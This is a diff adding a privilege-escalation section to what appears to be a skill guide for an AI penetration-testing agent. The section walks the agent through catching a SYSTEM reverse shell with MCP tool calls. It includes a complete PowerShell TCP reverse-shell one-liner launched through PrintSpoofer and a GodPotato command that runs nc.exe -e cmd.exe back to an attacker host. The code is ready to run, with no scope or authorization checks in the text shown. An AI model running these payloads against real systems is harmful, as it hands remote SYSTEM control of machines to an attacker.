@@ -467,6 +467,28 @@ Use tools like RawCopy, FTK Imager, or The Sleuth Kit for structured extraction.
 
 ## Step 5: Escalate or Pivot
 
+### Reverse Shell via MCP
+
+When token impersonation achieves SYSTEM, **catch the SYSTEM shell via the MCP
+shell-server** rather than relying on an interactive console or local nc
+listener. Potato exploits and token theft techniques spawn a new process as
+SYSTEM -- route it to the shell-server for agent interaction.
+
+1. Call `start_listener(port=4444)` to prepare a catcher on the attackbox
+2. Point the Potato exploit's command at a reverse shell:
+   ```cmd
+   :: PrintSpoofer / GodPotato / JuicyPotato:
+   PrintSpoofer.exe -c "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+   :: Or via nc.exe:
+   GodPotato-NET4.exe -cmd "cmd /c C:\temp\nc.exe ATTACKER PORT -e cmd.exe"
+   ```
+3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
+4. Verify the new privilege level with `send_command(session_id=..., command="whoami")`
+
+If the target lacks outbound connectivity, use `PrintSpoofer.exe -i -c cmd.exe`
+to spawn a local SYSTEM console and interact through an existing session, or
+use a bind shell payload.
+
 **Before routing**: Write `engagement/state.md` and append to
 `engagement/activity.md` with results so far. The next skill reads state.md
 on activation — stale state means duplicate work or missed context.
